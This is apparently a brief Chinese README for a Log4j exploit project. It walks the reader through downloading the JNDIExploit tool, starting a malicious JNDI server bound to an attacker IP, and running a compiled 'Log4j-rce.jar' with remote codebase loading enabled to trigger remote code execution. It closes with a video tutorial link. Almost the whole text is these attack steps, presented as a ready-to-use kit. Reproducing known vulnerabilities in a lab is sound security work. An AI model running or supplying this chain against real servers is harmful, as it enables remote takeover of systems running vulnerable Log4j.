# Log4j-exp
帮助你快速复现Log4j漏洞   
           
首先你可以去百度网盘或者github下载所需要的jar包来更方便快捷的开起jndi   
`https://github.com/feihong-cs/JNDIExploit`    
`https://pan.baidu.com/s/1lxXt-27-i7I_dOUACphVtQ 提取码: nkc5 `      
         
下载完成之后使用以下命令开一个jndi   
`java -jar JNDIExploit-1.2-SNAPSHOT.jar -i ip`         

        
下载本项目之后使用idea编译将项目编译为jar之后使用以下命令触发   
`java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar Log4j-rce.jar`         
    
下方是视频演示教学地址相信我你也可以变成光   
`https://www.bilibili.com/video/BV1iL4y1H7ax/`    

非常感谢HMCDC的分享
